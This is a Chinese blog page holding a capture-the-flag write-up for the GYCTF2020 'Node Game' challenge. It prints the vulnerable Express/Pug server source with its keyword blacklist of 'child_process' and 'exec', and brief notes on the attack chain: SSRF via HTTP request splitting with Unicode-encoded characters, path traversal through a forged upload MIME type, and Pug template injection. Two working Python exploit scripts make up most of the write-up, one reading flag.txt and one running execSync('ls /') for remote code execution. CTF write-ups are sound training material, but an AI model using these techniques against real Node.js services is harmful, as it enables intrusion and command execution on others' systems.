@@ -1,0 +1,188 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[GYCTF2020]Node Game - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[GYCTF2020]Node Game1234567891011121314151617181920212223242526272829303132333435363738394041424344,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[GYCTF2020]Node Game</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[GYCTF2020]Node Game</h1>
+        <div class="stuff">
+            <span>八月 06, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).array(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.use(morgan(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.use(<span class="string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;</span><br><span class="line">接受action参数。如果没有就默认为index</span><br><span class="line">file&#x3D;dirname+&#x2F;template&#x2F;+action+.png</span><br><span class="line">然后用pug进行渲染。可以理解为执行这个文件</span><br><span class="line"></span><br><span class="line">&#x2F;file_upload</span><br><span class="line">定义了只能由127.0.0.1访问。并且是remoteaddress不能伪造</span><br><span class="line">那么得找一个SSRF的点</span><br><span class="line">文件上传。</span><br><span class="line">filepath&#x3D;&#x2F;uploads&#x2F;+mimetype+&#x2F;</span><br><span class="line">而mimetype可控。那么我们可以跨目录</span><br><span class="line">dir_file&#x3D;dirname+filepath+filename</span><br><span class="line">那么我们可以构造任意路径文件写入</span><br><span class="line"></span><br><span class="line">&#x2F;core</span><br><span class="line">接受一个q参数。然后对其进行黑名单检测</span><br><span class="line">然后对q输入的值进行请求。。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>简单来说，就是先利用ssrf绕过对ip地址的检测，然后文件上传的时候通过构造参数，使得上传路径变为template目录下，然后在跟牡蛎传入action参数用pug渲染，最后执行文件</p>
+<p>两种方法，一种直接文件包含flag.txt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Length: 291</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;abc.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">x:&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(chr(int(<span class="string">&#x27;0xff&#x27;</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://a5424015-e9f0-4db0-9d84-472bda633e45.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>第二种利用nodejs来命令执行</p>
+<p>require(‘child_process’).execSync(‘ls /‘)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ls.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(chr(int(<span class="string">&#x27;0xff&#x27;</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://3806a2c7-9d80-451f-9af2-44d44dd18dd0.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
